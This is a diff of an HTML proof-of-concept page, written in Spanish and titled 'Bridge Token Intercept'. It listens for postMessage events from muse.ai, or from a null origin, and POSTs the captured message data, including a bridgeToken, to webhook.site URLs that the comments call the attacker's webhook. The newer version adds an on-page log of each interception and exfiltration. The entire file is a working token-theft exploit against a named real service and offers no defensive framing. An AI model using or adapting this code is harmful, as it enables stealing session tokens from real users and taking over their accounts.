@@ -1,24 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bridge Token Intercept</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
+        h1 { color: #fff; }
+        #console { background: #000; padding: 15px; border: 1px solid #333; border-radius: 8px; min-height: 200px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
+        .success { color: #0f0; font-weight: bold; }
+        .error { color: #f00; }
+        .info { color: #ff0; }
+    </style>
+</head>
 <body>
-    <h2>Interceptando Token...</h2>
-    <script>
-        const webhookUrl = "https://webhooksite.net/1467a562-a031-44ed-b7a0-4b33fe71f647";
+    <h1>Interceptando bridgeToken...</h1>
+    <div id="console">Esperando mensajes del padre (muse.ai)...</div>
 
-        // 1. Escuchamos CUALQUIER mensaje que venga del padre
+    <script>
+        const consola = document.getElementById('console');
+        const webhookUrl = "https://webhook.site/118f2af5-6014-4c45-ab14-1543fc773f54";
+
+        function log(msg, className) {
+            const line = document.createElement('div');
+            line.className = className || '';
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            consola.appendChild(line);
+            consola.scrollTop = consola.scrollHeight;
+        }
+
+        // 1. Escuchar mensajes del padre
         window.addEventListener("message", (event) => {
-            // 2. Solo nos interesan los mensajes de muse.ai (o de cualquiera, si el atacante es listo)
-            if (event.origin === "https://muse.ai") {
-                const data = JSON.stringify(event.data);
-                
-                // 3. Enviamos el mensaje (y el token) al webhook del atacante
-                fetch(`${webhookUrl}?bridge_token_leak=true`, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: data
-                });
+            // Verificamos si el mensaje viene de muse.ai (o si no tiene origen, como en el sandbox)
+            const isMuse = event.origin === "https://muse.ai" || event.origin === "null";
+            
+            if (isMuse) {
+                const dataString = JSON.stringify(event.data);
+                log("📩 Mensaje interceptado: " + dataString, "info");
+
+                // 2. Exfiltrar el mensaje al webhook
+                try {
+                    fetch(`${webhookUrl}?bridge_leak=true`, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: dataString
+                    });
+                    log("✅ Mensaje enviado al webhook.", "success");
+                } catch (e) {
+                    log("❌ Error al exfiltrar: " + e.message, "error");
+                }
+            } else {
+                log("⚠️ Mensaje de origen desconocido: " + event.origin, "error");
             }
         });
+
+        log("Listener de postMessage activo.", "success");
     </script>
 </body>
 </html>
